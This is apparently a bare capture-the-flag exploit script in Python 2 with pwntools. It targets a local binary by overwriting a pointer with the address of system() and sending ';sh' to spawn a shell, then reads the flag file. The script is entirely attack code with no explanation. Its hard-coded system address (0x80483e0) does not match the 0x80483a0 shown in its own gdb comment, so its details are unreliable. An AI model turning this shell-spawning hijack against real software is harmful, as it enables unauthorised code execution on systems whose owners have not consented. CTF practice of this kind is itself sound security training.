from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')

'''
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x80483a0 <system@plt>
'''

s.sendline("8\n")
system = 0x80483e0

s.send(p32(system)+';sh\x00')

s.sendline("echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()